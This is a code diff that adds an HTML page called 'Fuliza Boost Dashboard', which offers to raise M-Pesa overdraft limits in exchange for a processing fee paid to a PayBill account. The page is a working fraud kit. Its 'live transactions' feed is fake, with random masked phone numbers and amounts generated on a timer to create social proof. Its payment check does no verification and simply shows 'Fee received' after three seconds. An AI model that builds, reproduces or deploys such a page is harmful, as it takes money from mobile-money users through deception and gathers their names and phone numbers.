@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<!-- saved from url=(0041)http://127.0.0.1:5501/fuliza%20index.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title>Fuliza Boost Dashboard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        body {
+            margin: 0;
+            font-family: Segoe UI;
+            background: #f2f4f6
+        }
+        
+        header {
+            background: linear-gradient(90deg, #025331, #d32f2f);
+            color: #040404;
+            padding: 15px;
+            text-align: center
+        }
+        
+        .activity-bar {
+            background: #0a7c3a;
+            color: #fff;
+            padding: 8px;
+            font-size: 13px;
+            text-align: center;
+            animation: fade 6s infinite
+        }
+        
+        @keyframes fade {
+            0% {
+                opacity: 0
+            }
+            10% {
+                opacity: 1
+            }
+            90% {
+                opacity: 1
+            }
+            100% {
+                opacity: 0
+            }
+        }
+        
+        .wrapper {
+            max-width: 1200px;
+            margin: auto;
+            display: grid;
+            grid-template-columns: 1.2fr 2fr 1fr;
+            gap: 15px;
+            padding: 15px
+        }
+        
+        .card {
+            background: #ece8e8;
+            border-radius: 12px;
+            padding: 18px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, .1)
+        }
+        
+        .logo {
+            text-align: center;
+            font-size: 26px;
+            font-weight: bold;
+            color: #0a7c3a
+        }
+        
+        .rules {
+            font-size: 13px;
+            line-height: 1.6;
+            margin-top: 10px
+        }
+        
+        .rules li {
+            margin-bottom: 6px
+        }
+        
+        input,
+        textarea,
+        button {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            font-size: 14px
+        }
+        
+        button {
+            background: #0a7c3a;
+            color: #fff;
+            border: none;
+            font-size: 16px;
+            cursor: pointer
+        }
+        
+        button.red {
+            background: #d32f2f
+        }
+        
+        .hidden {
+            display: none
+        }
+        
+        .amount-boxes {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px
+        }
+        
+        .amount-box {
+            background: #e9f6ef;
+            border: 2px solid #0a7c3a;
+            border-radius: 10px;
+            padding: 14px;
+            text-align: center;
+            font-weight: bold;
+            cursor: pointer
+        }
+        
+        .amount-box.selected {
+            background: #0a7c3a;
+            color: white
+        }
+        
+        .fee-box {
+            font-weight: bold;
+            background: #f9f9f9;
+            padding: 10px;
+            border-left: 4px solid #d32f2f;
+            margin: 10px 0
+        }
+        
+        .live {
+            height: 420px;
+            overflow: hidden
+        }
+        
+        .live-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px;
+            border-bottom: 1px solid #d80606;
+            font-size: 13px
+        }
+        
+        .amount {
+            color: #0a7c3a;
+            font-weight: bold
+        }
+        
+        .status {
+            font-weight: bold
+        }
+        
+        .processing {
+            color: #ff9800
+        }
+        
+        .completed {
+            color: #0a7c3a
+        }
+        
+        .pulse {
+            animation: pulse 1.2s infinite
+        }
+        
+        @keyframes pulse {
+            0% {
+                opacity: .4
+            }
+            50% {
+                opacity: 1
+            }
+            100% {
+                opacity: .4
+            }
+        }
+        
+        .detail {
+            display: flex;
+            align-items: center;
+            gap: 5px
+        }
+        
+        .detail span {
+            width: 90px;
+            font-weight: bold
+        }
+        
+        .detail input {
+            flex: 1
+        }
+        
+        .detail button {
+            width: auto;
+            background: #d32f2f
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <h1>Fuliza Boost 💸</h1>
+        <p>Pesa Chap Chap – Fast &amp; Reliable</p>
+    </header>
+
+    <div class="activity-bar" id="activityBar">🔔 07****696 boosting KES 12000</div>
+
+    <div class="wrapper">
+
+        <!-- LEFT -->
+        <div class="card">
+            <div class="C:\Users\pc\Pictures\Screenshots\team fuliza icon.png">FULIZA BOOST</div>
+            <ul class="rules">
+                <li>✔ Only processing fee is paid</li>
+                <li>✔ Boost credited within 30 minutes</li>
+                <li>✔ Wrong payment details not refundable</li>
+                <li>✔ MPESA confirmation required</li>
+                <li>✔ Service available 24/7</li>
+            </ul>
+        </div>
+
+        <!-- CENTER -->
+        <div class="card">
+
+            <div id="step1">
+                <h3>Client Details</h3>
+                <input id="name" placeholder="Full Name">
+                <input id="phone" placeholder="Phone Number">
+                <button onclick="goStep2()">Proceed</button>
+            </div>
+
+            <div id="step2" class="hidden">
+                <h3>Select Amount</h3>
+
+                <div class="amount-boxes">
+                    <script>
+                        for (let i = 500; i <= 15000; i += 500) {
+                            document.write(`<div class="amount-box" onclick="selectAmount(${i},this)">KES ${i}</div>`);
+                        }
+                    </script><div class="amount-box" onclick="selectAmount(500,this)">KES 500</div><div class="amount-box" onclick="selectAmount(1000,this)">KES 1000</div><div class="amount-box" onclick="selectAmount(1500,this)">KES 1500</div><div class="amount-box" onclick="selectAmount(2000,this)">KES 2000</div><div class="amount-box" onclick="selectAmount(2500,this)">KES 2500</div><div class="amount-box" onclick="selectAmount(3000,this)">KES 3000</div><div class="amount-box" onclick="selectAmount(3500,this)">KES 3500</div><div class="amount-box" onclick="selectAmount(4000,this)">KES 4000</div><div class="amount-box" onclick="selectAmount(4500,this)">KES 4500</div><div class="amount-box" onclick="selectAmount(5000,this)">KES 5000</div><div class="amount-box" onclick="selectAmount(5500,this)">KES 5500</div><div class="amount-box" onclick="selectAmount(6000,this)">KES 6000</div><div class="amount-box" onclick="selectAmount(6500,this)">KES 6500</div><div class="amount-box" onclick="selectAmount(7000,this)">KES 7000</div><div class="amount-box" onclick="selectAmount(7500,this)">KES 7500</div><div class="amount-box" onclick="selectAmount(8000,this)">KES 8000</div><div class="amount-box" onclick="selectAmount(8500,this)">KES 8500</div><div class="amount-box" onclick="selectAmount(9000,this)">KES 9000</div><div class="amount-box" onclick="selectAmount(9500,this)">KES 9500</div><div class="amount-box" onclick="selectAmount(10000,this)">KES 10000</div><div class="amount-box" onclick="selectAmount(10500,this)">KES 10500</div><div class="amount-box" onclick="selectAmount(11000,this)">KES 11000</div><div class="amount-box" onclick="selectAmount(11500,this)">KES 11500</div><div class="amount-box" onclick="selectAmount(12000,this)">KES 12000</div><div class="amount-box" onclick="selectAmount(12500,this)">KES 12500</div><div class="amount-box" onclick="selectAmount(13000,this)">KES 13000</div><div class="amount-box" onclick="selectAmount(13500,this)">KES 13500</div><div class="amount-box" onclick="selectAmount(14000,this)">KES 14000</div><div class="amount-box" onclick="selectAmount(14500,this)">KES 14500</div><div class="amount-box" onclick="selectAmount(15000,this)">KES 15000</div>
+                </div>
+
+                <div class="fee-box" id="feeBox">Fee: KES 0</div>
+                <button onclick="goStep3()">Proceed to Payment</button>
+            </div>
+
+            <div id="step3" class="hidden">
+                <h3>PayBill Payment</h3>
+
+                <div class="detail">
+                    <span>PayBill</span>
+                    <input id="paybill" value="247247" readonly="">
+                    <button onclick="copy(&#39;paybill&#39;)">Copy</button>
+                </div>
+
+                <div class="detail">
+                    <span>Account</span>
+                    <input id="account" value="1100185777880" readonly="">
+                    <button onclick="copy(&#39;account&#39;)">Copy</button>
+                </div>
+
+                <textarea id="mpesa" placeholder="Paste MPESA confirmation message"></textarea>
+                <button onclick="submitPay()">Submit Confirmation</button>
+                <div id="status"></div>
+            </div>
+
+        </div>
+
+        <!-- RIGHT -->
+        <div class="card">
+            <h3>Live Transactions</h3>
+            <div class="live" id="liveBox">
+  <div class="live-item pulse">
+   <span>07****696</span>
+   <span class="amount">KES 12000</span>
+   <span class="status processing">Processing</span>
+  </div>
+  <div class="live-item pulse">
+   <span>07****916</span>
+   <span class="amount">KES 9500</span>
+   <span class="status processing">Processing</span>
+  </div>
+  <div class="live-item pulse">
+   <span>07****359</span>
+   <span class="amount">KES 1500</span>
+   <span class="status processing">Processing</span>
+  </div>
+  <div class="live-item pulse">
+   <span>07****258</span>
+   <span class="amount">KES 8500</span>
+   <span class="status processing">Processing</span>
+  </div>
+  <div class="live-item pulse">
+   <span>07****110</span>
+   <span class="amount">KES 9500</span>
+   <span class="status processing">Processing</span>
+  </div>
+  <div class="live-item pulse">
+   <span>07****273</span>
+   <span class="amount">KES 14000</span>
+   <span class="status processing">Processing</span>
+  </div>
+  <div class="live-item pulse">
+   <span>07****914</span>
+   <span class="amount">KES 6500</span>
+   <span class="status processing">Processing</span>
+  </div>
+  <div class="live-item pulse">
+   <span>07****117</span>
+   <span class="amount">KES 8000</span>
+   <span class="status processing">Processing</span>
+  </div>
+  <div class="live-item pulse">
+   <span>07****972</span>
+   <span class="amount">KES 12000</span>
+   <span class="status processing">Processing</span>
+  </div>
+  <div class="live-item pulse">
+   <span>07****813</span>
+   <span class="amount">KES 4000</span>
+   <span class="status processing">Processing</span>
+  </div>
+  <div class="live-item pulse">
+   <span>07****830</span>
+   <span class="amount">KES 11000</span>
+   <span class="status processing">Processing</span>
+  </div>
+  <div class="live-item pulse">
+   <span>07****812</span>
+   <span class="amount">KES 15000</span>
+   <span class="status processing">Processing</span>
+  </div>
+  <div class="live-item pulse">
+   <span>07****809</span>
+   <span class="amount">KES 15000</span>
+   <span class="status processing">Processing</span>
+  </div>
+  <div class="live-item pulse">
+   <span>07****503</span>
+   <span class="amount">KES 6000</span>
+   <span class="status processing">Processing</span>
+  </div>
+  <div class="live-item pulse">
+   <span>07****616</span>
+   <span class="amount">KES 8500</span>
+   <span class="status processing">Processing</span>
+  </div></div>
+        </div>
+
+    </div>
+
+    <audio id="sound">
+<source src="https://assets.mixkit.co/sfx/preview/mixkit-correct-answer-tone-2870.mp3">
+</audio>
+
+    <script>
+        const step1 = document.getElementById("step1");
+        const step2 = document.getElementById("step2");
+        const step3 = document.getElementById("step3");
+        const feeBox = document.getElementById("feeBox");
+        const liveBox = document.getElementById("liveBox");
+        const activity = document.getElementById("activityBar");
+        const sound = document.getElementById("sound");
+
+        let selectedAmount = 0;
+        let liveData = [];
+
+        function goStep2() {
+            step1.classList.add("hidden");
+            step2.classList.remove("hidden")
+        }
+
+        function goStep3() {
+            if (!selectedAmount) return alert("Select amount");
+            step2.classList.add("hidden");
+            step3.classList.remove("hidden")
+        }
+
+        function feeCalc(a) {
+            if (a <= 7000) return Math.round(a * 0.20);
+            if (a >= 8000 && a <= 15000) return Math.round(a * 0.10);
+            return 0;
+        }
+
+        function selectAmount(a, el) {
+            selectedAmount = a;
+            document.querySelectorAll(".amount-box").forEach(b => b.classList.remove("selected"));
+            el.classList.add("selected");
+            feeBox.innerText = `Fee: KES ${feeCalc(a)}`;
+        }
+
+        function copy(id) {
+            const i = document.getElementById(id);
+            i.select();
+            document.execCommand("copy");
+        }
+
+        function randomPhone() {
+            return "07****" + Math.floor(100 + Math.random() * 900)
+        }
+
+        function randomAmount() {
+            return Math.floor(Math.random() * 15000 / 500) * 500 + 500
+        }
+
+        function render() {
+            liveBox.innerHTML = "";
+            liveData.forEach(d => {
+                liveBox.innerHTML += `
+  <div class="live-item ${d.s=='Processing'?'pulse':''}">
+   <span>${d.p}</span>
+   <span class="amount">KES ${d.a}</span>
+   <span class="status ${d.s.toLowerCase()}">${d.s}</span>
+  </div>`;
+            });
+        }
+
+        setInterval(() => {
+            const amt = randomAmount();
+            const phone = randomPhone();
+            liveData.unshift({
+                p: phone,
+                a: amt,
+                s: "Processing"
+            });
+            if (liveData.length > 15) liveData.pop();
+            activity.innerText = `🔔 ${phone} boosting KES ${amt}`;
+            sound.play();
+            render();
+        }, Math.floor(Math.random() * 3000) + 2000);
+
+        function submitPay() {
+            document.getElementById("status").innerHTML = "⏳ Verifying payment …";
+            setTimeout(() => {
+                document.getElementById("status").innerHTML = "✅ Fee received. confimation then boost will follow… the activity takes 30 min";
+            }, 3000);
+        }
+    </script>
+
+<!-- Code injected by live-server -->
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script>
+
+
+</body></html>
